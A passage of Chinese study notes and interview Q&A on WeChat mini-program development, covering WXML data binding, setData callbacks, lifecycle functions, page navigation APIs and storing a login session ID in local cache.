的属性或者行为，进而引起界面一些变化。当项目越来越大的时候，你的代码会充斥着非常多的界面交互逻辑和程序的各种状态变量，显然这不是一个很好的开发模式，因此就有了 MVVM 的开发模式（例如 React, Vue），提倡把渲染和逻辑分离。简单来说就是不要再让 JS 直接操控 DOM，JS 只需要管理状态即可，然后再通过一种模板语法来描述状态和界面结构的关系即可。 WXML 通过 来绑定 WXML 文件和对应的 JavaScript 文件中的 data 对象属性。如果你需要把一个 Hello World 的字符串显示在界面上。 WXML 是这么写 : 1&lt;text&gt;&#123;&#123;msg&#125;&#125;&lt;/text&gt; JS 只需要管理状态即可: 1this.setData(&#123; msg: "Hello World" &#125;) 通过 特定的语法把一个变量绑定到界面上，我们称为数据绑定。仅仅通过数据绑定还不够完整的描述状态和界面的关系，还需要 if/else, for等控制能力，在小程序里边，这些控制能力都用 wx: 开头的属性来表达。 setData传递数据实际是一个异步的过程，所以setData的第二个参数是一个callback回调，在这次setData对界面渲染完毕后触发。setData其一般调用格式是 setData(data, callback)，其中data是由多个key: value构成的Object对象。 12345678910// page.jsPage(&#123; onLoad: function()&#123; this.setData(&#123; text: 'change data' &#125;, function()&#123; // 在这次setData对界面渲染完毕后触发 &#125;) &#125;&#125;) 其他登录 利用本地缓存的能力来持久化存储用户登录态SessionId 123456app.globalData.sessionId =data.sessionIdwx.setStorageSync('SESSIONID',data.sessionId)// 假设登录态保持1天var expiredTime = +new Date() +1*24*60*60*1000app.globalData.expiredTime =expiredTimewx.setStorageSync('EXPIREDTIME',expiredTime) 1 请谈谈微信小程序主要目录和文件的作用？ project.config.json 项目配置文件，用得最多的就是配置是否开启https校验； App.js 设置一些全局的基础数据等； App.json 底部tab, 标题栏和路由等设置； App.wxss 公共样式，引入iconfont等； pages 里面包含一个个具体的页面； index.json (配置当前页面标题和引入组件等)； index.wxml (页面结构)； index.wxss (页面样式表)； index.js (页面的逻辑，请求和数据处理等)； 2 请谈谈wxml与标准的html的异同？ 都是用来描述页面的结构； 都由标签、属性等构成； 标签名字不一样，且小程序标签更少，单一标签更多； 多了一些 wx:if 这样的属性以及 这样的表达式 WXML仅能在微信小程序开发者工具中预览，而HTML可以在浏览器内预览 组件封装不同， WXML对组件进行了重新封装， 小程序运行在JS Core内，没有DOM树和window对象，小程序中无法使用window对象和document对象。 3 请谈谈WXSS和CSS的异同？ 都是用来描述页面的样子； WXSS 具有 CSS 大部分的特性，也做了一些扩充和修改； WXSS新增了尺寸单位，WXSS 在底层支持新的尺寸单位 rpx； WXSS 仅支持部分 CSS 选择器； WXSS 提供全局样式与局部样式 4 你是怎么封装微信小程序的数据请求的？ 在根目录下创建utils目录及api.js文件和apiConfig.js文件； 在apiConfig.js 封装基础的get, post 和 put， upload等请求方法，设置请求体，带上token和异常处理等； 在api中引入apiConfig.js封装好的请求方法，根据页面数据请求的urls, 设置对应的方法并导出； 在具体的页面中导入； 5 小程序页面间有哪些传递数据的方法？ 使用全局变量实现数据传递 页面跳转或重定向时，使用url带参数传递数据 使用组件模板 template传递参数 使用缓存传递参数 使用数据库传递数据 6 请谈谈小程序的双向绑定和vue的异同？大体相同，但小程序直接this.data的属性是不可以同步到视图的，必须调用this.setData()方法！ 7 请谈谈小程序的生命周期函数？ onLoad() 页面加载时触发，只会调用一次，可获取当前页面路径中的参数。 onShow() 页面显示/切入前台时触发，一般用来发送数据请求； onReady() 页面初次渲染完成时触发, 只会调用一次，代表页面已可和视图层进行交互。 onHide() 页面隐藏/切入后台时触发, 如底部 tab 切换到其他页面或小程序切入后台等。 onUnload() 页面卸载时触发，如redirectTo或navigateBack到其他页面时。 8 简述微信小程序原理？ 小程序本质就是一个单页面应用，所有的页面渲染和事件处理，都在一个页面内进行，但又可以通过微信客户端调用原生的各种接口； 它的架构，是数据驱动的架构模式，它的UI和数据是分离的，所有的页面更新，都需要通过对数据的更改来实现； 它从技术讲和现有的前端开发差不多，采用JavaScript、WXML、WXSS三种技术进行开发； 功能可分为webview和appService两个部分； webview用来展现UI，appService有来处理业务逻辑、数据及接口调用； 两个部分在两个进程中运行，通过系统层JSBridge实现通信，实现UI的渲染、事件的处理等。 9 请谈谈原生开发小程序、wepy、mpvue 的对比？ 个人认为，如果是新项目，且没有旧的 h5 项目迁移，则考虑用小程序原生开发，好处是相比于第三方框架，坑少。 而如果有 老的 h5 项目是 vue 开发 或者 也有 h5 项目也需要小程序开发，则比较适合 wepy 或者 mpvue 来做迁移或者开发，近期看wepy几乎不更新了，所以推荐美团的mpvue。 而如果如果团队前端强大，自己做一套框架也没问题。 1.如何实现下拉刷新 首先在app.json或者页面的json中配置enablePullDownRefresh为true 在 Page中使用onPullDownRefresh 函数,该函数在下拉刷新时执行 在下拉函数执行时发起数据请求，请求返回后，调用 wx.stopPullDownRefresh 停止下拉刷新的状态 2.怎么解决小程序的异步请求问题 不封装接口的话可以在返回成功的回调里面处理逻辑 可以用Promise 来封装 可以引用runtime来使用async await 使用wepy或着美团的小程序框架，可以通过安装库解决 3.封装微信小程序的数据请求的 将所有的接口放在统一的js文件中并导出 在app.js中创建封装请求数据的方法 在子页面中调用封装的方法请求数据 4.bindtap和catchtap的区别是什么 bindtap是不会阻止冒泡事件的，catchtap是阻值冒泡的 5.跳转页面 wx.navigateTo()：保留当前页面，跳转到应用内的某个页面。但是不能跳到 tabbar 页面（参数必须为字符串） wx.redirectTo()：关闭当前页面，跳转到应用内的某个页面。但是不允许跳转到 tabbar 页面 wx.switchTab()：跳转到 abBar 页面，并关闭其他所有非 tabBar 页面 wx.navigateBack()关闭当前页面，返回上一页面或多级页面。可通过 getCurrentPages() 获取当前的页面栈，决定需要返回几层 wx.reLaunch()：关闭所有页面，打开到应用内的某个页面 通过navigator跳转 6.小程序跳转tab需要注意哪些？ 答：必须用wx.switchTab(Object object)，需要跳转的页面必须是在app.json中的tabBar注册过的，并且路径后不能带参数 7.小程序如何实现跨页面跳转 1//这个步骤有点长，先挖个坑，以后有时间填 8.wxml传值 添加data-属性来传递我们需要的值，然后通过e.currentTarget.dataset获取 需要注意：命名如果有大写，如：data-ID，在获取的时候都是小写，即：ev.currentTarget.dataset.id 9.app.onLaunch的异步解决 12//回调//还有别的方法 以后再写 感觉能写一篇 10.setData的回调函数 答：微信小程序的setData实现是和react的setData实现类似的，所以它也是一个异步函数，并且有回调函数的参数，当然平时小量数据我们可能并没有感觉到它的异步，但是为了确保逻辑的正确执行，在需要用到setData后 data里的数据的步骤，请写入setData的回调函数中，如下示例： 1234this.setData(&#123; a: this.data.a++ &#125;,()=&gt;&#123;&#125;)]]></content>
  </entry>
</search>
